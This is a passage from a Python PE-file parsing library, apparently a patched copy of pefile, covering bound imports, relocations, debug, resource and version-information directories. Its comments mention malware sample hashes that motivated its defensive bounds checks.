            if not rf.unwindinfo.FunctionEntry in rva2rt:
                self.__warnings.append( "FunctionEntry of UNWIND_INFO at 0x%x  points to an entry that does not exist" % rf.struct.get_file_offset())
                continue
            try:
                rf.unwindinfo.set_chained_function_entry(
                    rva2rt[rf.unwindinfo.FunctionEntry]
                )
            except PEFormatError as excp:
                self.__warnings.append( "Failed parsing FunctionEntry of UNWIND_INFO at 0x%x: %r" % (rf.struct.get_file_offset(), excp) )
                continue

        return rt_funcs

    def parse_directory_bound_imports(self, rva, size):
        """"""

        bnd_descr = Structure(self.__IMAGE_BOUND_IMPORT_DESCRIPTOR_format__)
        bnd_descr_size = bnd_descr.sizeof()
        start = rva

        bound_imports = []
        while True:
            bnd_descr = self.__unpack_data__(
                self.__IMAGE_BOUND_IMPORT_DESCRIPTOR_format__,
                self.__data__[rva : rva + bnd_descr_size],
                file_offset=rva,
            )
            if bnd_descr is None:
                # If can't parse directory then silently return.
                # This directory does not necessarily have to be valid to
                # still have a valid PE file

                self.__warnings.append(
                    "The Bound Imports directory exists but can't be parsed."
                )

                return

            if bnd_descr.all_zeroes():
                break

            rva += bnd_descr.sizeof()

            section = self.get_section_by_offset(rva)
            file_offset = self.get_offset_from_rva(rva)
            if section is None:
                safety_boundary = len(self.__data__) - file_offset
                sections_after_offset = [
                    s.PointerToRawData
                    for s in self.sections
                    if s.PointerToRawData > file_offset
                ]
                if sections_after_offset:
                    # Find the first section starting at a later offset than that
                    # specified by 'rva'
                    first_section_after_offset = min(sections_after_offset)
                    section = self.get_section_by_offset(first_section_after_offset)
                    if section is not None:
                        safety_boundary = section.PointerToRawData - file_offset
            else:
                safety_boundary = (
                    section.PointerToRawData + len(section.get_data()) - file_offset
                )
            if not section:
                self.__warnings.append(
                    (
                        "RVA of IMAGE_BOUND_IMPORT_DESCRIPTOR points "
                        "to an invalid address: {0:x}"
                    ).format(rva)
                )
                return

            forwarder_refs = []
            # 8 is the size of __IMAGE_BOUND_IMPORT_DESCRIPTOR_format__
            for _ in range(
                min(bnd_descr.NumberOfModuleForwarderRefs, int(safety_boundary / 8))
            ):
                # Both structures IMAGE_BOUND_IMPORT_DESCRIPTOR and
                # IMAGE_BOUND_FORWARDER_REF have the same size.
                bnd_frwd_ref = self.__unpack_data__(
                    self.__IMAGE_BOUND_FORWARDER_REF_format__,
                    self.__data__[rva : rva + bnd_descr_size],
                    file_offset=rva,
                )
                # OC Patch:
                if not bnd_frwd_ref:
                    raise PEFormatError("IMAGE_BOUND_FORWARDER_REF cannot be read")
                rva += bnd_frwd_ref.sizeof()

                offset = start + bnd_frwd_ref.OffsetModuleName
                name_str = self.get_string_from_data(
                    0, self.__data__[offset : offset + MAX_STRING_LENGTH]
                )

                # OffsetModuleName points to a DLL name. These shouldn't be too long.
                # Anything longer than a safety length of 128 will be taken to indicate
                # a corrupt entry and abort the processing of these entries.
                # Names shorter than 4 characters will be taken as invalid as well.

                if name_str:
                    invalid_chars = [
                        c for c in bytearray(name_str) if chr(c) not in string.printable
                    ]
                    if len(name_str) > 256 or invalid_chars:
                        break

                forwarder_refs.append(
                    BoundImportRefData(struct=bnd_frwd_ref, name=name_str)
                )

            offset = start + bnd_descr.OffsetModuleName
            name_str = self.get_string_from_data(
                0, self.__data__[offset : offset + MAX_STRING_LENGTH]
            )

            if name_str:
                invalid_chars = [
                    c for c in bytearray(name_str) if chr(c) not in string.printable
                ]
                if len(name_str) > 256 or invalid_chars:
                    break

            if not name_str:
                break
            bound_imports.append(
                BoundImportDescData(
                    struct=bnd_descr, name=name_str, entries=forwarder_refs
                )
            )

        return bound_imports

    def parse_directory_tls(self, rva, size):
        """"""

        # By default let's pretend the format is a 32-bit PE. It may help
        # produce some output for files where the Magic in the Optional Header
        # is incorrect.
        format = self.__IMAGE_TLS_DIRECTORY_format__

        if self.PE_TYPE == OPTIONAL_HEADER_MAGIC_PE_PLUS:
            format = self.__IMAGE_TLS_DIRECTORY64_format__

        try:
            tls_struct = self.__unpack_data__(
                format,
                self.get_data(rva, Structure(format).sizeof()),
                file_offset=self.get_offset_from_rva(rva),
            )
        except PEFormatError:
            self.__warnings.append(
                "Invalid TLS information. Can't read " "data at RVA: 0x%x" % rva
            )
            tls_struct = None

        if not tls_struct:
            return None

        return TlsData(struct=tls_struct)

    def parse_directory_load_config(self, rva, size):
        """"""

        if self.PE_TYPE == OPTIONAL_HEADER_MAGIC_PE:
            format = self.__IMAGE_LOAD_CONFIG_DIRECTORY_format__
        elif self.PE_TYPE == OPTIONAL_HEADER_MAGIC_PE_PLUS:
            format = self.__IMAGE_LOAD_CONFIG_DIRECTORY64_format__
        else:
            self.__warnings.append(
                "Don't know how to parse LOAD_CONFIG information for non-PE32/"
                "PE32+ file"
            )
            return None

        load_config_struct = None
        try:
            load_config_struct = self.__unpack_data__(
                format,
                self.get_data(rva, Structure(format).sizeof()),
                file_offset=self.get_offset_from_rva(rva),
            )
        except PEFormatError:
            self.__warnings.append(
                "Invalid LOAD_CONFIG information. Can't read " "data at RVA: 0x%x" % rva
            )

        if not load_config_struct:
            return None

        return LoadConfigData(struct=load_config_struct)

    def parse_relocations_directory(self, rva, size):
        """"""

        rlc_size = Structure(self.__IMAGE_BASE_RELOCATION_format__).sizeof()
        end = rva + size

        relocations = []
        while rva < end:

            # OC Patch:
            # Malware that has bad RVA entries will cause an error.
            # Just continue on after an exception
            #
            try:
                rlc = self.__unpack_data__(
                    self.__IMAGE_BASE_RELOCATION_format__,
                    self.get_data(rva, rlc_size),
                    file_offset=self.get_offset_from_rva(rva),
                )
            except PEFormatError:
                self.__warnings.append(
                    "Invalid relocation information. Can't read "
                    "data at RVA: 0x%x" % rva
                )
                rlc = None

            if not rlc:
                break

            # rlc.VirtualAddress must lie within the Image
            if rlc.VirtualAddress > self.OPTIONAL_HEADER.SizeOfImage:
                self.__warnings.append(
                    "Invalid relocation information. VirtualAddress outside"
                    " of Image: 0x%x" % rlc.VirtualAddress
                )
                break

            # rlc.SizeOfBlock must be less or equal than the size of the image
            # (It's a rather loose sanity test)
            if rlc.SizeOfBlock > self.OPTIONAL_HEADER.SizeOfImage:
                self.__warnings.append(
                    "Invalid relocation information. SizeOfBlock too large"
                    ": %d" % rlc.SizeOfBlock
                )
                break

            reloc_entries = self.parse_relocations(
                rva + rlc_size, rlc.VirtualAddress, rlc.SizeOfBlock - rlc_size
            )

            relocations.append(BaseRelocationData(struct=rlc, entries=reloc_entries))

            if not rlc.SizeOfBlock:
                break
            rva += rlc.SizeOfBlock

        return relocations

    def parse_relocations(self, data_rva, rva, size):
        """"""

        try:
            data = self.get_data(data_rva, size)
            file_offset = self.get_offset_from_rva(data_rva)
        except PEFormatError:
            self.__warnings.append("Bad RVA in relocation data: 0x%s" % data_rva)
            return []

        entries = []
        offsets_and_type = []
        for idx in range(int(len(data) / 2)):

            entry = self.__unpack_data__(
                self.__IMAGE_BASE_RELOCATION_ENTRY_format__,
                data[idx * 2 : (idx + 1) * 2],
                file_offset=file_offset,
            )

            if not entry:
                break
            word = entry.Data

            reloc_type = word >> 12
            reloc_offset = word & 0x0FFF
            if (reloc_offset, reloc_type) in offsets_and_type:
                self.__warnings.append(
                    "Overlapping offsets in relocation data "
                    "at RVA: 0x%x" % (reloc_offset + rva)
                )
                break
            if len(offsets_and_type) >= 1000:
                offsets_and_type.pop()
            offsets_and_type.insert(0, (reloc_offset, reloc_type))

            entries.append(
                RelocationData(
                    struct=entry, type=reloc_type, base_rva=rva, rva=reloc_offset + rva
                )
            )
            file_offset += entry.sizeof()

        return entries

    def parse_debug_directory(self, rva, size):
        """"""

        dbg_size = Structure(self.__IMAGE_DEBUG_DIRECTORY_format__).sizeof()

        debug = []
        for idx in range(int(size / dbg_size)):
            try:
                data = self.get_data(rva + dbg_size * idx, dbg_size)
            except PEFormatError:
                self.__warnings.append(
                    "Invalid debug information. Can't read " "data at RVA: 0x%x" % rva
                )
                return None

            dbg = self.__unpack_data__(
                self.__IMAGE_DEBUG_DIRECTORY_format__,
                data,
                file_offset=self.get_offset_from_rva(rva + dbg_size * idx),
            )

            if not dbg:
                return None

            # apply structure according to DEBUG_TYPE
            # http://www.debuginfo.com/articles/debuginfomatch.html
            #
            dbg_type = None

            if dbg.Type == 1:
                # IMAGE_DEBUG_TYPE_COFF
                pass

            elif dbg.Type == 2:
                # if IMAGE_DEBUG_TYPE_CODEVIEW
                dbg_type_offset = dbg.PointerToRawData
                dbg_type_size = dbg.SizeOfData
                dbg_type_data = self.__data__[
                    dbg_type_offset : dbg_type_offset + dbg_type_size
                ]

                if dbg_type_data[:4] == b"RSDS":
                    # pdb7.0
                    __CV_INFO_PDB70_format__ = [
                        "CV_INFO_PDB70",
                        [
                            "I,CvSignature",
                            "I,Signature_Data1",  # Signature is of GUID type
                            "H,Signature_Data2",
                            "H,Signature_Data3",
                            "8s,Signature_Data4",
                            # 'H,Signature_Data5',
                            # 'I,Signature_Data6',
                            "I,Age",
                        ],
                    ]
                    pdbFileName_size = (
                        dbg_type_size - Structure(__CV_INFO_PDB70_format__).sizeof()
                    )

                    # pdbFileName_size can be negative here, as seen in the malware
                    # sample with hash
                    # MD5: 7c297600870d026c014d42596bb9b5fd
                    # SHA256:
                    #   83f4e63681fcba8a9d7bbb1688c71981b1837446514a1773597e0192bba9fac3
                    # Checking for positive size here to ensure proper parsing.
                    if pdbFileName_size > 0:
                        __CV_INFO_PDB70_format__[1].append(
                            "{0}s,PdbFileName".format(pdbFileName_size)
                        )
                    dbg_type = self.__unpack_data__(
                        __CV_INFO_PDB70_format__, dbg_type_data, dbg_type_offset
                    )

                elif dbg_type_data[:4] == b"NB10":
                    # pdb2.0
                    __CV_INFO_PDB20_format__ = [
                        "CV_INFO_PDB20",
                        [
                            "I,CvHeaderSignature",
                            "I,CvHeaderOffset",
                            "I,Signature",
                            "I,Age",
                        ],
                    ]
                    pdbFileName_size = (
                        dbg_type_size - Structure(__CV_INFO_PDB20_format__).sizeof()
                    )

                    # As with the PDB 7.0 case, ensuring a positive size for
                    # pdbFileName_size to ensure proper parsing.
                    if pdbFileName_size > 0:
                        # Add the last variable-length string field.
                        __CV_INFO_PDB20_format__[1].append(
                            "{0}s,PdbFileName".format(pdbFileName_size)
                        )
                    dbg_type = self.__unpack_data__(
                        __CV_INFO_PDB20_format__, dbg_type_data, dbg_type_offset
                    )

            elif dbg.Type == 4:
                # IMAGE_DEBUG_TYPE_MISC
                dbg_type_offset = dbg.PointerToRawData
                dbg_type_size = dbg.SizeOfData
                dbg_type_data = self.__data__[
                    dbg_type_offset : dbg_type_offset + dbg_type_size
                ]
                ___IMAGE_DEBUG_MISC_format__ = [
                    "IMAGE_DEBUG_MISC",
                    [
                        "I,DataType",
                        "I,Length",
                        "B,Unicode",
                        "B,Reserved1",
                        "H,Reserved2",
                    ],
                ]
                dbg_type_partial = self.__unpack_data__(
                    ___IMAGE_DEBUG_MISC_format__, dbg_type_data, dbg_type_offset
                )

                # Need to check that dbg_type_partial contains a correctly unpacked data
                # structure, as the malware sample with the following hash
                # MD5:    5e7d6707d693108de5a303045c17d95b
                # SHA256:
                #  5dd94a95025f3b6e3dd440d52f7c6d2964fdd1aa119e0ee92e38c7bf83829e5c
                # contains a value of None for dbg_type_partial after unpacking,
                # presumably due to a malformed DEBUG entry.
                if dbg_type_partial:
                    # The Unicode bool should be set to 0 or 1.
                    if dbg_type_partial.Unicode in (0, 1):
                        data_size = (
                            dbg_type_size
                            - Structure(___IMAGE_DEBUG_MISC_format__).sizeof()
                        )

                        # As with the PDB case, ensuring a positive size for data_size
                        # here to ensure proper parsing.
                        if data_size > 0:
                            ___IMAGE_DEBUG_MISC_format__[1].append(
                                "{0}s,Data".format(data_size)
                            )
                        dbg_type = self.__unpack_data__(
                            ___IMAGE_DEBUG_MISC_format__, dbg_type_data, dbg_type_offset
                        )

            debug.append(DebugData(struct=dbg, entry=dbg_type))

        return debug

    def parse_resources_directory(self, rva, size=0, base_rva=None, level=0, dirs=None):
        """Parse the resources directory.

        Given the RVA of the resources directory, it will process all
        its entries.

        The root will have the corresponding member of its structure,
        IMAGE_RESOURCE_DIRECTORY plus 'entries', a list of all the
        entries in the directory.

        Those entries will have, correspondingly, all the structure's
        members (IMAGE_RESOURCE_DIRECTORY_ENTRY) and an additional one,
        "directory", pointing to the IMAGE_RESOURCE_DIRECTORY structure
        representing upper layers of the tree. This one will also have
        an 'entries' attribute, pointing to the 3rd, and last, level.
        Another directory with more entries. Those last entries will
        have a new attribute (both 'leaf' or 'data_entry' can be used to
        access it). This structure finally points to the resource data.
        All the members of this structure, IMAGE_RESOURCE_DATA_ENTRY,
        are available as its attributes.
        """

        # OC Patch:
        if dirs is None:
            dirs = [rva]

        if base_rva is None:
            base_rva = rva

        if level > MAX_RESOURCE_DEPTH:
            self.__warnings.append(
                "Error parsing the resources directory. "
                "Excessively nested table depth %d (>%s)" % (level, MAX_RESOURCE_DEPTH)
            )
            return None

        try:
            # If the RVA is invalid all would blow up. Some EXEs seem to be
            # specially nasty and have an invalid RVA.
            data = self.get_data(
                rva, Structure(self.__IMAGE_RESOURCE_DIRECTORY_format__).sizeof()
            )
        except PEFormatError:
            self.__warnings.append(
                "Invalid resources directory. Can't read "
                "directory data at RVA: 0x%x" % rva
            )
            return None

        # Get the resource directory structure, that is, the header
        # of the table preceding the actual entries
        #
        resource_dir = self.__unpack_data__(
            self.__IMAGE_RESOURCE_DIRECTORY_format__,
            data,
            file_offset=self.get_offset_from_rva(rva),
        )
        if resource_dir is None:
            # If we can't parse resources directory then silently return.
            # This directory does not necessarily have to be valid to
            # still have a valid PE file
            self.__warnings.append(
                "Invalid resources directory. Can't parse "
                "directory data at RVA: 0x%x" % rva
            )
            return None

        dir_entries = []

        # Advance the RVA to the position immediately following the directory
        # table header and pointing to the first entry in the table
        #
        rva += resource_dir.sizeof()

        number_of_entries = (
            resource_dir.NumberOfNamedEntries + resource_dir.NumberOfIdEntries
        )

        # Set a hard limit on the maximum reasonable number of entries
        MAX_ALLOWED_ENTRIES = 4096
        if number_of_entries > MAX_ALLOWED_ENTRIES:
            self.__warnings.append(
                "Error parsing the resources directory. "
                "The directory contains %d entries (>%s)"
                % (number_of_entries, MAX_ALLOWED_ENTRIES)
            )
            return None

        self.__total_resource_entries_count += number_of_entries
        if self.__total_resource_entries_count > MAX_RESOURCE_ENTRIES:
            self.__warnings.append(
                "Error parsing the resources directory. "
                "The file contains at least %d entries (>%d)"
                % (self.__total_resource_entries_count, MAX_RESOURCE_ENTRIES)
            )
            return None

        strings_to_postprocess = []

        # Keep track of the last name's start and end offsets in order
        # to be able to detect overlapping entries that might suggest
        # and invalid or corrupt directory.
        last_name_begin_end = None
        for idx in range(number_of_entries):
            if (
                not self.__resource_size_limit_reached
                and self.__total_resource_bytes > self.__resource_size_limit_upperbounds
            ):

                self.__resource_size_limit_reached = True
                self.__warnings.append(
                    "Resource size 0x%x exceeds file size 0x%x, overlapping "
                    "resources found."
                    % (
                        self.__total_resource_bytes,
                        self.__resource_size_limit_upperbounds,
                    )
                )

            res = self.parse_resource_entry(rva)
            if res is None:
                self.__warnings.append(
                    "Error parsing the resources directory, "
                    "Entry %d is invalid, RVA = 0x%x. " % (idx, rva)
                )
                break

            entry_name = None
            entry_id = None

            name_is_string = (res.Name & 0x80000000) >> 31
            if not name_is_string:
                entry_id = res.Name
            else:
                ustr_offset = base_rva + res.NameOffset
                try:
                    entry_name = UnicodeStringWrapperPostProcessor(self, ustr_offset)
                    self.__total_resource_bytes += entry_name.get_pascal_16_length()
                    # If the last entry's offset points before the current's but its end
                    # is past the current's beginning, assume the overlap indicates a
                    # corrupt name.
                    if last_name_begin_end and (
                        last_name_begin_end[0] < ustr_offset
                        and last_name_begin_end[1] >= ustr_offset
                    ):
                        # Remove the previous overlapping entry as it's likely to be
                        # already corrupt data.
                        strings_to_postprocess.pop()
                        self.__warnings.append(
                            "Error parsing the resources directory, "
                            "attempting to read entry name. "
                            "Entry names overlap 0x%x" % (ustr_offset)
                        )
                        break

                    last_name_begin_end = (
                        ustr_offset,
                        ustr_offset + entry_name.get_pascal_16_length(),
                    )

                    strings_to_postprocess.append(entry_name)

                except PEFormatError:
                    self.__warnings.append(
                        "Error parsing the resources directory, "
                        "attempting to read entry name. "
                        "Can't read unicode string at offset 0x%x" % (ustr_offset)
                    )

            if res.DataIsDirectory:
                # OC Patch:
                #
                # One trick malware can do is to recursively reference
                # the next directory. This causes hilarity to ensue when
                # trying to parse everything correctly.
                # If the original RVA given to this function is equal to
                # the next one to parse, we assume that it's a trick.
                # Instead of raising a PEFormatError this would skip some
                # reasonable data so we just break.
                #
                # 9ee4d0a0caf095314fd7041a3e4404dc is the offending sample
                if base_rva + res.OffsetToDirectory in dirs:
                    break

                entry_directory = self.parse_resources_directory(
                    base_rva + res.OffsetToDirectory,
                    size - (rva - base_rva),  # size
                    base_rva=base_rva,
                    level=level + 1,
                    dirs=dirs + [base_rva + res.OffsetToDirectory],
                )

                if not entry_directory:
                    break

                # Ange Albertini's code to process resources' strings
                #
                strings = None
                if entry_id == RESOURCE_TYPE["RT_STRING"]:
                    strings = {}
                    for resource_id in entry_directory.entries:
                        if hasattr(resource_id, "directory"):

                            resource_strings = {}

                            for resource_lang in resource_id.directory.entries:

                                if (
                                    resource_lang is None
                                    or not hasattr(resource_lang, "data")
                                    or resource_lang.data.struct.Size is None
                                    or resource_id.id is None
                                ):
                                    continue

                                string_entry_rva = (
                                    resource_lang.data.struct.OffsetToData
                                )
                                string_entry_size = resource_lang.data.struct.Size
                                string_entry_id = resource_id.id

                                # XXX: has been raising exceptions preventing parsing
                                try:
                                    string_entry_data = self.get_data(
                                        string_entry_rva, string_entry_size
                                    )
                                except PEFormatError:
                                    self.__warnings.append( "Error parsing resource of type RT_STRING at RVA 0x%x with size %d" % (string_entry_rva, string_entry_size))
                                    continue

                                parse_strings(
                                    string_entry_data,
                                    (int(string_entry_id) - 1) * 16,
                                    resource_strings,
                                )
                                strings.update(resource_strings)

                            resource_id.directory.strings = resource_strings

                dir_entries.append(
                    ResourceDirEntryData(
                        struct=res,
                        name=entry_name,
                        id=entry_id,
                        directory=entry_directory,
                    )
                )

            else:
                struct = self.parse_resource_data_entry(
                    base_rva + res.OffsetToDirectory
                )

                if struct:
                    self.__total_resource_bytes += struct.Size
                    entry_data = ResourceDataEntryData(
                        struct=struct, lang=res.Name & 0x3FF, sublang=res.Name >> 10
                    )

                    dir_entries.append(
                        ResourceDirEntryData(
                            struct=res, name=entry_name, id=entry_id, data=entry_data
                        )
                    )

                else:
                    break

            # Check if this entry contains version information
            #
            if level == 0 and res.Id == RESOURCE_TYPE["RT_VERSION"]:
                if dir_entries:
                    last_entry = dir_entries[-1]

                try:
                    version_entries = last_entry.directory.entries[0].directory.entries
                except:
                    # Maybe a malformed directory structure...?
                    # Let's ignore it
                    pass
                else:
                    for version_entry in version_entries:
                        rt_version_struct = None
                        try:
                            rt_version_struct = version_entry.data.struct
                        except:
                            # Maybe a malformed directory structure...?
                            # Let's ignore it
                            pass

                        if rt_version_struct is not None:
                            self.parse_version_information(rt_version_struct)

            rva += res.sizeof()

        string_rvas = [s.get_rva() for s in strings_to_postprocess]
        string_rvas.sort()

        for idx, s in enumerate(strings_to_postprocess):
            s.render_pascal_16()

        resource_directory_data = ResourceDirData(
            struct=resource_dir, entries=dir_entries
        )

        return resource_directory_data

    def parse_resource_data_entry(self, rva):
        """Parse a data entry from the resources directory."""

        try:
            # If the RVA is invalid all would blow up. Some EXEs seem to be
            # specially nasty and have an invalid RVA.
            data = self.get_data(
                rva, Structure(self.__IMAGE_RESOURCE_DATA_ENTRY_format__).sizeof()
            )
        except PEFormatError:
            self.__warnings.append(
                "Error parsing a resource directory data entry, "
                "the RVA is invalid: 0x%x" % (rva)
            )
            return None

        data_entry = self.__unpack_data__(
            self.__IMAGE_RESOURCE_DATA_ENTRY_format__,
            data,
            file_offset=self.get_offset_from_rva(rva),
        )

        return data_entry

    def parse_resource_entry(self, rva):
        """Parse a directory entry from the resources directory."""

        try:
            data = self.get_data(
                rva, Structure(self.__IMAGE_RESOURCE_DIRECTORY_ENTRY_format__).sizeof()
            )
        except PEFormatError:
            # A warning will be added by the caller if this method returns None
            return None

        resource = self.__unpack_data__(
            self.__IMAGE_RESOURCE_DIRECTORY_ENTRY_format__,
            data,
            file_offset=self.get_offset_from_rva(rva),
        )

        if resource is None:
            return None

        # resource.NameIsString = (resource.Name & 0x80000000L) >> 31
        resource.NameOffset = resource.Name & 0x7FFFFFFF

        resource.__pad = resource.Name & 0xFFFF0000
        resource.Id = resource.Name & 0x0000FFFF

        resource.DataIsDirectory = (resource.OffsetToData & 0x80000000) >> 31
        resource.OffsetToDirectory = resource.OffsetToData & 0x7FFFFFFF

        return resource

    def parse_version_information(self, version_struct):
        """Parse version information structure.

        The date will be made available in three attributes of the PE object.

        VS_VERSIONINFO   will contain the first three fields of the main structure:
            'Length', 'ValueLength', and 'Type'

        VS_FIXEDFILEINFO will hold the rest of the fields, accessible as sub-attributes:
            'Signature', 'StrucVersion', 'FileVersionMS', 'FileVersionLS',
            'ProductVersionMS', 'ProductVersionLS', 'FileFlagsMask', 'FileFlags',
            'FileOS', 'FileType', 'FileSubtype', 'FileDateMS', 'FileDateLS'

        FileInfo    is a list of all StringFileInfo and VarFileInfo structures.

        StringFileInfo structures will have a list as an attribute named 'StringTable'
        containing all the StringTable structures. Each of those structures contains a
        dictionary 'entries' with all the key / value version information string pairs.

        VarFileInfo structures will have a list as an attribute named 'Var' containing
        all Var structures. Each Var structure will have a dictionary as an attribute
        named 'entry' which will contain the name and value of the Var.
        """

        # Retrieve the data for the version info resource
        #
        try:
            start_offset = self.get_offset_from_rva(version_struct.OffsetToData)
        except PEFormatError:
            self.__warnings.append(
                "Error parsing the version information, "
                "attempting to read OffsetToData with RVA: 0x{:x}".format(
                    version_struct.OffsetToData
                )
            )
            return
        raw_data = self.__data__[start_offset : start_offset + version_struct.Size]

        # Map the main structure and the subsequent string
        #
        versioninfo_struct = self.__unpack_data__(
            self.__VS_VERSIONINFO_format__, raw_data, file_offset=start_offset
        )

        if versioninfo_struct is None:
            return

        ustr_offset = version_struct.OffsetToData + versioninfo_struct.sizeof()
        section = self.get_section_by_rva(ustr_offset)
        section_end = None
        if section:
            section_end = section.VirtualAddress + max(
                section.SizeOfRawData, section.Misc_VirtualSize
            )

        versioninfo_string = None
        # These should return 'ascii' decoded data. For the case when it's
        # garbled data the ascii string will retain the byte values while
        # encoding it to something else may yield values that don't match the
        # file's contents.
        try:
            if section_end is None:
                versioninfo_string = self.get_string_u_at_rva(
                    ustr_offset, encoding="ascii"
                )
            else:
                versioninfo_string = self.get_string_u_at_rva(
                    ustr_offset, (section_end - ustr_offset) >> 1, encoding="ascii"
                )
        except PEFormatError:
            self.__warnings.append(
                "Error parsing the version information, "
                "attempting to read VS_VERSION_INFO string. Can't "
                "read unicode string at offset 0x%x" % (ustr_offset)
            )

        if versioninfo_string is None:
            self.__warnings.append(
                "Invalid VS_VERSION_INFO block: {0}".format(versioninfo_string)
            )
            return

        # If the structure does not contain the expected name, it's assumed to
        # be invalid
        if versioninfo_string is not None and versioninfo_string != b"VS_VERSION_INFO":
            if len(versioninfo_string) > 128:
                excerpt = versioninfo_string[:128].decode("ascii")
                # Don't leave any half-escaped characters
                excerpt = excerpt[: excerpt.rfind("\\u")]
                versioninfo_string = b(
                    "{0} ... ({1} bytes, too long to display)".format(
                        excerpt, len(versioninfo_string)
                    )
                )
            self.__warnings.append(
                "Invalid VS_VERSION_INFO block: {0}".format(
                    versioninfo_string.decode("ascii").replace("\00", "\\00")
                )
            )
            return

        if not hasattr(self, "VS_VERSIONINFO"):
            self.VS_VERSIONINFO = []

        # Set the PE object's VS_VERSIONINFO to this one
        vinfo = versioninfo_struct

        # Set the Key attribute to point to the unicode string identifying the structure
        vinfo.Key = versioninfo_string

        self.VS_VERSIONINFO.append(vinfo)

        if versioninfo_string is None:
            versioninfo_string = ""
        # Process the fixed version information, get the offset and structure
        fixedfileinfo_offset = self.dword_align(
            versioninfo_struct.sizeof() + 2 * (len(versioninfo_string) + 1),
            version_struct.OffsetToData,
        )
        fixedfileinfo_struct = self.__unpack_data__(
            self.__VS_FIXEDFILEINFO_format__,
            raw_data[fixedfileinfo_offset:],
            file_offset=start_offset + fixedfileinfo_offset,
        )

        if not fixedfileinfo_struct:
            return

        if not hasattr(self, "VS_FIXEDFILEINFO"):
            self.VS_FIXEDFILEINFO = []

        # Set the PE object's VS_FIXEDFILEINFO to this one
        self.VS_FIXEDFILEINFO.append(fixedfileinfo_struct)

        # Start parsing all the StringFileInfo and VarFileInfo structures

        # Get the first one
        stringfileinfo_offset = self.dword_align(
            fixedfileinfo_offset + fixedfileinfo_struct.sizeof(),
            version_struct.OffsetToData,
        )

        # Set the PE object's attribute that will contain them all.
        if not hasattr(self, "FileInfo"):
            self.FileInfo = []

        finfo = []
        while True:

            # Process the StringFileInfo/VarFileInfo structure
            stringfileinfo_struct = self.__unpack_data__(
                self.__StringFileInfo_format__,
                raw_data[stringfileinfo_offset:],
                file_offset=start_offset + stringfileinfo_offset,
            )

            if stringfileinfo_struct is None:
                self.__warnings.append(
                    "Error parsing StringFileInfo/VarFileInfo struct"
                )
                return None

            # Get the subsequent string defining the structure.
            ustr_offset = (
                version_struct.OffsetToData
                + stringfileinfo_offset
                + versioninfo_struct.sizeof()
            )
            try:
                stringfileinfo_string = self.get_string_u_at_rva(ustr_offset)
            except PEFormatError:
                self.__warnings.append(
                    "Error parsing the version information, "
                    "attempting to read StringFileInfo string. Can't "
                    "read unicode string at offset 0x{0:x}".format(ustr_offset)
                )
                break

            # Set such string as the Key attribute
            stringfileinfo_struct.Key = stringfileinfo_string

            # Append the structure to the PE object's list
            finfo.append(stringfileinfo_struct)

            # Parse a StringFileInfo entry
            if stringfileinfo_string and stringfileinfo_string.startswith(
                b"StringFileInfo"
            ):

                if (
                    stringfileinfo_struct.Type in (0, 1)
                    and stringfileinfo_struct.ValueLength == 0
                ):

                    stringtable_offset = self.dword_align(
                        stringfileinfo_offset
                        + stringfileinfo_struct.sizeof()
                        + 2 * (len(stringfileinfo_string) + 1),
                        version_struct.OffsetToData,
                    )

                    stringfileinfo_struct.StringTable = []

                    # Process the String Table entries
                    while True:

                        stringtable_struct = self.__unpack_data__(
                            self.__StringTable_format__,
                            raw_data[stringtable_offset:],
                            file_offset=start_offset + stringtable_offset,
                        )

                        if not stringtable_struct:
                            break

                        ustr_offset = (
                            version_struct.OffsetToData
                            + stringtable_offset
                            + stringtable_struct.sizeof()
                        )
                        try:
                            stringtable_string = self.get_string_u_at_rva(ustr_offset)
                        except PEFormatError:
                            self.__warnings.append(
                                "Error parsing the version information, "
                                "attempting to read StringTable string. Can't "
                                "read unicode string at offset 0x{0:x}".format(
                                    ustr_offset
                                )
                            )
                            break

                        stringtable_struct.LangID = stringtable_string
                        stringtable_struct.entries = {}
                        stringtable_struct.entries_offsets = {}
                        stringtable_struct.entries_lengths = {}
                        stringfileinfo_struct.StringTable.append(stringtable_struct)

                        entry_offset = self.dword_align(
                            stringtable_offset
                            + stringtable_struct.sizeof()
                            + 2 * (len(stringtable_string) + 1),
                            version_struct.OffsetToData,
                        )

                        # Process all entries in the string table

                        while (
                            entry_offset
                            < stringtable_offset + stringtable_struct.Length
                        ):

                            string_struct = self.__unpack_data__(
                                self.__String_format__,
                                raw_data[entry_offset:],
                                file_offset=start_offset + entry_offset,
                            )

                            if not string_struct:
                                break

                            ustr_offset = (
                                version_struct.OffsetToData
                                + entry_offset
                                + string_struct.sizeof()
                            )
                            try:
                                key = self.get_string_u_at_rva(ustr_offset)
                                key_offset = self.get_offset_from_rva(ustr_offset)
                            except PEFormatError:
                                self.__warnings.append(
                                    "Error parsing the version information, "
                                    "attempting to read StringTable Key string. Can't "
                                    "read unicode string at offset 0x{0:x}".format(
                                        ustr_offset
                                    )
                                )
                                break

                            value_offset = self.dword_align(
                                2 * (len(key) + 1)
                                + entry_offset
                                + string_struct.sizeof(),
                                version_struct.OffsetToData,
                            )

                            ustr_offset = version_struct.OffsetToData + value_offset
                            try:
                                value = self.get_string_u_at_rva(
                                    ustr_offset, max_length=string_struct.ValueLength
                                )
                                value_offset = self.get_offset_from_rva(ustr_offset)
                            except PEFormatError:
                                self.__warnings.append( "Error parsing the version information, attempting to read StringTable Value string. Can't read unicode string at offset 0x%x" % ustr_offset)
                                break

                            if string_struct.Length == 0:
                                entry_offset = (
                                    stringtable_offset + stringtable_struct.Length
                                )
                            else:
                                entry_offset = self.dword_align(
                                    string_struct.Length + entry_offset,
                                    version_struct.OffsetToData,
                                )

                            stringtable_struct.entries[key] = value
                            stringtable_struct.entries_offsets[key] = (
                                key_offset,
                                value_offset,
                            )
                            stringtable_struct.entries_lengths[key] = (
                                len(key),
                                len(value),
                            )

                        new_stringtable_offset = self.dword_align(
                            stringtable_struct.Length + stringtable_offset,
                            version_struct.OffsetToData,
                        )

                        # Check if the entry is crafted in a way that would lead
                        # to an infinite loop and break if so.
                        if new_stringtable_offset == stringtable_offset:
                            break
                        stringtable_offset = new_stringtable_offset

                        if stringtable_offset >= stringfileinfo_struct.Length:
                            break

            # Parse a VarFileInfo entry
            elif stringfileinfo_string and stringfileinfo_string.startswith(
                b"VarFileInfo"
            ):

                varfileinfo_struct = stringfileinfo_struct
                varfileinfo_struct.name = "VarFileInfo"

                if (
                    varfileinfo_struct.Type in (0, 1)
                    and varfileinfo_struct.ValueLength == 0
                ):

                    var_offset = self.dword_align(
                        stringfileinfo_offset
                        + varfileinfo_struct.sizeof()
                        + 2 * (len(stringfileinfo_string) + 1),
                        version_struct.OffsetToData,
                    )

